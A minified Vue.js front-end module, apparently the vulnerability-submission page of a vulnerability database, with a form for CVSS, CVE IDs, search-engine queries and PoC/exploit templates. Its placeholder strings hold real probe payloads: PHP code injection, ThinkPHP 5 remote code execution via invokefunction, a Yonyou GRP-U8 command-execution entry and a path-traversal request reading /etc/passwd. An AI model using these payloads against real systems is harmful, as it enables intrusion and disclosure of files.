import{d as ee,u as le,a as ae,y as te,r as i,o as ue,j as V,w as n,i as o,f as q,g as oe,h as _,e as w,b as l,c as ne,H as se,I as de,t as f,J as re,k as x,K as ie,C as T,F as pe,L as ce,M as me,N as ve,O as be,P as ye,m as fe,Q as _e,G as we,R as he,S as ge,T as Ve}from"./index-BZXfLavj.js";/* empty css                *//* empty css                   *//* empty css                    *//* empty css               *//* empty css                  *//* empty css                 */import{c as qe}from"./utils-CYkVsYWI.js";/* empty css                   */const xe={style:{"font-weight":"lighter","font-size":"17px"}},Se={class:"el-upload__text"},ke={class:"el-upload__tip"},h=`name: poc-yaml-test-php-rce
manual: true
transport: http
set:
  s1: randomInt(100000000, 200000000)
  s2: randomInt(10000, 20000)
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /index.php
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: <?={{s2}}-{{s1}};
    expression: response.status == 200 && response.body_string.contains(string(s2 - s1))
expression: r0()
detail:
  author: test
  links:
    - https://test.com`,I=`id: thinkphp-5022-rce

info:
  name: ThinkPHP - Remote Code Execution
  author: dr_set
  severity: critical
  description: ThinkPHP 5.0.22 and 5.1.29 are susceptible to remote code execution if the website doesn't have mandatory routing enabled, which is the default setting. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce
  metadata:
    max-request: 1
  tags: thinkphp,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "PHP Extension"
          - "PHP Version"
          - "ThinkPHP"
        condition: and

      - type: status
        status:
          - 200

# digest: 4b0a00483046022100ee65575ab1901e3f23b7c1891b8a08b0b6e5593256533a8450d227df88ab679d022100920cc2dba8c2ffb1ae53faa6ff927fe673b15ef8d2326504825b870f6d398cd5:922c64590222798bb761d5b6d8e72950`,R=`{
  "Name": "Yonyou GRP-U8 RCE with SQLi",
  "Description": "用友GRP-U8行政事业财务管理软件是用友公司专注于国家电子政务事业，基于云计算技术所推出的新一代产品。当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。",
  "Product": "Yonyou-GRP-U8",
  "Homepage": "https://www.yonyou.com/",
  "DisclosureDate": "2020-09-11",
  "Author": "itardc@163.com",
  "FofaQuery": "app="Yonyou-GRP-U8"",
  "Level": "3",
  "Impact": "当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击",
  "Recommendation": "官方已发布针对此漏洞的修复补丁。",
  "References": [
    "https://nosec.org/home/detail/4561.html"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "cmd",
      "type": "input",
      "value": "whoami"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": null,
  "ExploitSteps": null,
  "Tags": ["rce", "sqli"],
  "CVEIDs": null,
  "CVSSScore": null,
  "AttackSurfaces": {
    "Application": ["Yonyou-GRP-U8"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`,H=`POST /v1/app/readFileSync HTTP/1.1
Host: {{Host}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://<IP>:<Port>
contentType: application/json
Content-Type: text/plain;charset=UTF-8
Content-Length: 48
Origin: http://<IP>:<Port>
Connection: close

["file:/../../../../../../etc/passwd","utf-8"]`,Ge=ee({__name:"Submit",setup(Ue){const{t:u}=le(),S=ae(),k=te(),g=sessionStorage.getItem("token"),U=i("/api/v1/addvuln"),E=i(!1),c=i("xray"),m=i("xray"),P=i([]),B=[qe,N,G],b=i(h),y=i(h),v=i("--"),e=i({vuln_name:"",vuln_type_id:1,cvss:.1,vuln_level:"",cve:"",nvd:"",edb:"",cnnvd:"",cnvd:"",affected_product:"",repair_suggestion:"",poc:"",exp:"",poc_type:c.value,exp_type:m.value,is_public:!1,description:"",fofa_query:"",zoom_eye_query:"",quake_query:"",hunter_query:"",google_query:"",shodan_query:"",censys_query:"",greynoise_query:"",attachment_id:"",affected_product_version:""});ue(()=>{B.forEach(r=>{r()})});function G(){const r=S.query.id;if(S.redirectedFrom.path==="/myvulns"){const a=JSON.parse(localStorage.getItem("form"));a.id===r&&(e.value=a,U.value="/api/v1/editvuln"),E.value=!0}else localStorage.removeItem("form")}function F(){localStorage.removeItem("form"),k.back()}async function N(){try{const r=await q.get("/api/v1/getvulntypes");P.value=r.data.data}catch{}}const A=()=>{if(e.value.cvss=Number(e.value.cvss),e.value.cvss>0&&e.value.cvss<4){e.value.vuln_level="Low",v.value=u("app.webui.low");return}else if(e.value.cvss>=4&&e.value.cvss<7){e.value.vuln_level="Medium",v.value=u("app.webui.medium");return}else if(e.value.cvss>=7&&e.value.cvss<9){e.value.vuln_level="High",v.value=u("app.webui.high");return}else if(e.value.cvss>=9&&e.value.cvss<=10){e.value.vuln_level="Critical",v.value=u("app.webui.critical");return}else T.error(u("app.webui.cvsserror"))},$=()=>{e.value.poc_type=c.value,c.value=="xray"?b.value=h:c.value=="nuclei"?b.value=I:c.value=="goby"?b.value=R:b.value=H},L=()=>{e.value.exp_type=m.value,m.value=="xray"?y.value=h:m.value=="nuclei"?y.value=I:m.value=="goby"?y.value=R:y.value=H},M=()=>{ge.confirm(u("app.webui.submitsuccessnotice"),u("app.webui.submitsuccess"),{confirmButtonText:u("el.datepicker.confirm"),cancelButtonText:u("el.datepicker.cancel"),type:"success"}).then(()=>{k.push("/")}).catch(()=>{location.reload()})},O=r=>{e.value.attachment_id=r.file_id},D=async()=>{try{const r={headers:{Authorization:`Bearer ${g}`}},a=await q.get("/delete/file?id="+e.value.attachment_id,r);e.value.attachment_id=""}catch{}},Q=async()=>{try{const r={headers:{Authorization:`Bearer ${g}`}},a=await q.post(U.value,e.value,r);a.data.code==0?(sessionStorage.removeItem("token"),sessionStorage.removeItem("username"),sessionStorage.removeItem("avatar"),location.reload()):a.data.code==1?M():T.error(u("app.webui.submitfailnotice"))}catch(r){console.error(r)}};return(r,a)=>{const d=pe,s=ce,Y=Ve,W=me,j=ve,p=be,z=ye,J=fe,K=_e,C=we,X=he,Z=oe;return _(),V(Z,{style:{width:"70%",margin:"auto","font-weight":"bold","font-size":"20px"},shadow:"always",header:o(u)("app.webui.vulninfo")},{default:n(()=>[w("div",xe,[l(X,{inline:"true",model:e.value,"label-width":"auto",size:"large"},{default:n(()=>[l(s,{label:o(u)("app.webui.vulnname"),prop:"vuln_name",style:{width:"45%"},rules:[{required:!0,message:o(u)("app.webui.required")}]},{default:n(()=>[l(d,{modelValue:e.value.vuln_name,"onUpdate:modelValue":a[0]||(a[0]=t=>e.value.vuln_name=t)},null,8,["modelValue"])]),_:1},8,["label","rules"]),l(s,{label:o(u)("app.webui.vulntype"),style:{width:"45%"},required:""},{default:n(()=>[l(W,{modelValue:e.value.vuln_type_id,"onUpdate:modelValue":a[1]||(a[1]=t=>e.value.vuln_type_id=t),placeholder:o(u)("el.select.placeholder")},{default:n(()=>[(_(!0),ne(de,null,se(P.value,t=>(_(),V(Y,{key:t.id,label:t.name,value:t.id},null,8,["label","value"]))),128))]),_:1},8,["modelValue","placeholder"])]),_:1},8,["label"]),l(s,{label:o(u)("app.webui.affectedproduct"),prop:"affected_product",style:{width:"45%"},rules:[{required:!0,message:o(u)("app.webui.required")}]},{default:n(()=>[l(d,{modelValue:e.value.affected_product,"onUpdate:modelValue":a[2]||(a[2]=t=>e.value.affected_product=t)},null,8,["modelValue"])]),_:1},8,["label","rules"]),l(s,{label:o(u)("app.webui.productversion"),style:{width:"45%"},prop:"affected_product_version",rules:[{required:!0,message:o(u)("app.webui.required")}]},{default:n(()=>[l(d,{modelValue:e.value.affected_product_version,"onUpdate:modelValue":a[3]||(a[3]=t=>e.value.affected_product_version=t)},null,8,["modelValue"])]),_:1},8,["label","rules"]),l(s,{label:"CVSS",style:{width:"29%"},required:""},{default:n(()=>[l(d,{modelValue:e.value.cvss,"onUpdate:modelValue":a[4]||(a[4]=t=>e.value.cvss=t),type:"number",step:"0.1",onChange:A},null,8,["modelValue"])]),_:1}),l(s,{label:o(u)("app.webui.vulnlevel"),style:{width:"29%"},required:""},{default:n(()=>[l(d,{modelValue:v.value,"onUpdate:modelValue":a[5]||(a[5]=t=>v.value=t),readonly:"",disabled:""},null,8,["modelValue"])]),_:1},8,["label"]),l(s,{label:o(u)("app.webui.ispublic"),style:{width:"29%"}},{default:n(()=>[l(j,{modelValue:e.value.is_public,"onUpdate:modelValue":a[6]||(a[6]=t=>e.value.is_public=t)},null,8,["modelValue"])]),_:1},8,["label"]),l(s,{label:o(u)("app.webui.cveid"),style:{width:"29%"}},{default:n(()=>[l(d,{modelValue:e.value.cve,"onUpdate:modelValue":a[7]||(a[7]=t=>e.value.cve=t)},null,8,["modelValue"])]),_:1},8,["label"]),l(s,{label:o(u)("app.webui.nvdid"),style:{width:"29%"}},{default:n(()=>[l(d,{modelValue:e.value.nvd,"onUpdate:modelValue":a[8]||(a[8]=t=>e.value.nvd=t)},null,8,["modelValue"])]),_:1},8,["label"]),l(s,{label:o(u)("app.webui.edbid"),style:{width:"29%"}},{default:n(()=>[l(d,{modelValue:e.value.edbid,"onUpdate:modelValue":a[9]||(a[9]=t=>e.value.edbid=t)},null,8,["modelValue"])]),_:1},8,["label"]),l(s,{label:o(u)("app.webui.cnnvdid"),style:{width:"29%"}},{default:n(()=>[l(d,{modelValue:e.value.cnnvd,"onUpdate:modelValue":a[10]||(a[10]=t=>e.value.cnnvd=t)},null,8,["modelValue"])]),_:1},8,["label"]),l(s,{label:o(u)("app.webui.cnvdid"),style:{width:"29%"}},{default:n(()=>[l(d,{modelValue:e.value.cnvd,"onUpdate:modelValue":a[11]||(a[11]=t=>e.value.cnvd=t)},null,8,["modelValue"])]),_:1},8,["label"]),l(s,{label:`Fofa ${o(u)("app.webui.searchquery")}`,style:{width:"45%"}},{default:n(()=>[l(d,{modelValue:e.value.fofa_query,"onUpdate:modelValue":a[12]||(a[12]=t=>e.value.fofa_query=t)},null,8,["modelValue"])]),_:1},8,["label"]),l(s,{label:`ZoomEye ${o(u)("app.webui.searchquery")}`,style:{width:"45%"}},{default:n(()=>[l(d,{modelValue:e.value.zoom_eye_query,"onUpdate:modelValue":a[13]||(a[13]=t=>e.value.zoom_eye_query=t)},null,8,["modelValue"])]),_:1},8,["label"]),l(s,{label:`Quake ${o(u)("app.webui.searchquery")}`,style:{width:"45%"}},{default:n(()=>[l(d,{modelValue:e.value.quake_query,"onUpdate:modelValue":a[14]||(a[14]=t=>e.value.quake_query=t)},null,8,["modelValue"])]),_:1},8,["label"]),l(s,{label:`Hunter ${o(u)("app.webui.searchquery")}`,style:{width:"45%"}},{default:n(()=>[l(d,{modelValue:e.value.hunter_query,"onUpdate:modelValue":a[15]||(a[15]=t=>e.value.hunter_query=t)},null,8,["modelValue"])]),_:1},8,["label"]),l(s,{label:`Google ${o(u)("app.webui.searchquery")}`,style:{width:"45%"}},{default:n(()=>[l(d,{modelValue:e.value.google_query,"onUpdate:modelValue":a[16]||(a[16]=t=>e.value.google_query=t)},null,8,["modelValue"])]),_:1},8,["label"]),l(s,{label:`Shodan ${o(u)("app.webui.searchquery")}`,style:{width:"45%"}},{default:n(()=>[l(d,{modelValue:e.value.shodan_query,"onUpdate:modelValue":a[17]||(a[17]=t=>e.value.shodan_query=t)},null,8,["modelValue"])]),_:1},8,["label"]),l(s,{label:`Censys ${o(u)("app.webui.searchquery")}`,style:{width:"45%"}},{default:n(()=>[l(d,{modelValue:e.value.censys_query,"onUpdate:modelValue":a[18]||(a[18]=t=>e.value.censys_query=t)},null,8,["modelValue"])]),_:1},8,["label"]),l(s,{label:`Greynoise ${o(u)("app.webui.searchquery")}`,style:{width:"45%"}},{default:n(()=>[l(d,{modelValue:e.value.greynoise_query,"onUpdate:modelValue":a[19]||(a[19]=t=>e.value.greynoise_query=t)},null,8,["modelValue"])]),_:1},8,["label"]),l(s,{label:o(u)("app.webui.vulndesc"),style:{width:"90%"},prop:"description",rules:[{required:!0,message:o(u)("app.webui.required")}]},{default:n(()=>[l(d,{modelValue:e.value.description,"onUpdate:modelValue":a[20]||(a[20]=t=>e.value.description=t),type:"textarea",autosize:""},null,8,["modelValue"])]),_:1},8,["label","rules"]),l(s,{label:o(u)("app.webui.vulnsuggest"),style:{width:"90%"},prop:"repair_suggestion",rules:[{required:!0,message:o(u)("app.webui.required")}]},{default:n(()=>[l(d,{modelValue:e.value.repair_suggestion,"onUpdate:modelValue":a[21]||(a[21]=t=>e.value.repair_suggestion=t),type:"textarea",autosize:""},null,8,["modelValue"])]),_:1},8,["label","rules"]),l(s,{label:"Poc",style:{width:"90%"},onChange:$},{default:n(()=>[l(z,{modelValue:c.value,"onUpdate:modelValue":a[22]||(a[22]=t=>c.value=t),size:"large"},{default:n(()=>[l(p,{label:"Xray",value:"xray"}),l(p,{label:"Nuclei",value:"nuclei"}),l(p,{label:"Goby",value:"goby"}),l(p,{label:o(u)("app.webui.other"),value:"other"},null,8,["label"])]),_:1},8,["modelValue"]),l(d,{modelValue:e.value.poc,"onUpdate:modelValue":a[23]||(a[23]=t=>e.value.poc=t),type:"textarea",placeholder:b.value,autosize:"",style:{"margin-top":"2%"}},null,8,["modelValue","placeholder"])]),_:1}),l(s,{label:"Exp",style:{width:"90%"},onChange:L},{default:n(()=>[l(z,{modelValue:m.value,"onUpdate:modelValue":a[24]||(a[24]=t=>m.value=t),size:"large"},{default:n(()=>[l(p,{label:"Xray",value:"xray"}),l(p,{label:"Nuclei",value:"nuclei"}),l(p,{label:"Goby",value:"goby"}),l(p,{label:o(u)("app.webui.other"),value:"other"},null,8,["label"])]),_:1},8,["modelValue"]),l(d,{modelValue:e.value.exp,"onUpdate:modelValue":a[25]||(a[25]=t=>e.value.exp=t),type:"textarea",placeholder:y.value,autosize:"",style:{"margin-top":"2%"}},null,8,["modelValue","placeholder"])]),_:1}),l(s,{label:o(u)("app.webui.attachfile"),style:{width:"100%"}},{default:n(()=>[l(K,{class:"upload-demo",drag:"",accept:".zip,.doc,.docx,.pdf,.txt",action:"/api/v1/upload",headers:{Authorization:`Bearer ${o(g)}`},"on-success":O,"on-remove":D,style:{width:"90%"}},{tip:n(()=>[w("div",ke,f(o(u)("app.webui.uploadnotice1")),1)]),default:n(()=>[l(J,{class:"el-icon--upload"},{default:n(()=>[l(o(re))]),_:1}),w("div",Se,[x(f(o(u)("app.webui.draguplaod"))+" ",1),w("em",null,f(o(u)("app.webui.clickupload")),1)])]),_:1},8,["headers"])]),_:1},8,["label"]),l(s,{style:{width:"100%","margin-left":"35%"}},{default:n(()=>[E.value?(_(),V(C,{key:0,size:"large",onClick:F,style:{width:"30%","font-size":"16px"},"auto-insert-space":""},{default:n(()=>[x(f(o(u)("app.webui.back")),1)]),_:1})):ie("",!0),l(C,{type:"primary",size:"large",onClick:Q,style:{width:"30%","font-size":"16px"},"auto-insert-space":""},{default:n(()=>[x(f(o(u)("app.webui.submitvuln")),1)]),_:1})]),_:1})]),_:1},8,["model"])])]),_:1},8,["header"])}}});export{Ge as default};
